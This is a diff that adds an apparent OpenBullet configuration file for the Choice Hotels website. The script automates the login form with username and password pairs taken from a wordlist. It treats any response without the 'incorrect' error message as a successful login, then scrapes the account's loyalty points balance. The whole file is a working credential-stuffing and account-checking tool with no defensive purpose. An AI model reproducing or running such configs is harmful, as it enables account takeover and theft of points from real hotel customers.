@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "ChoiceHotels",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-13T19:06:29.7734561+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BROWSERACTION Open "" 
+IF "<ADDRESS>" EqualTo "https://www.choicehotels.com/"
+JUMP #CLEAR_USER
+ENDIF
+
+NAVIGATE "https://www.choicehotels.com/" 60 
+#FORM ELEMENTACTION XPath "//*[@id=\"header-sign-in-button\"]" 
+  Click "" -> VAR "" 
+#CLEAR_USER ELEMENTACTION XPath "//*[@id=\"cpSignInUsername\"]" 
+  Clear "" -> VAR "" 
+#CLEAR_PASS ELEMENTACTION XPath "//*[@id=\"cpSignInPassword\"]" 
+  Clear "" -> VAR "" 
+#USER ELEMENTACTION XPath "//*[@id=\"cpSignInUsername\"]" 
+  SendKeys "<USER>" -> VAR "" 
+#PASS ELEMENTACTION XPath "//*[@id=\"cpSignInPassword\"]" 
+  SendKeys "<PASS>" -> VAR "" 
+#SUBMIT ELEMENTACTION XPath "//*[@id=\"modal-content\"]/div/div[2]/div[2]/div/ch-login-form-global/form/div/div[4]/button" 
+  Click "" -> VAR "" 
+#FAIL KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The username or password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "The username or password is incorrect" 
+NAVIGATE "https://www.choicehotels.com/choice-privileges/account" 60 
+ELEMENTACTION XPath "//*[@id=\"mainContent\"]/div[1]/main/section[3]/div/div/div[1]/div/div/div[1]/span" 
+  GetText "" -> CAP "Points" 
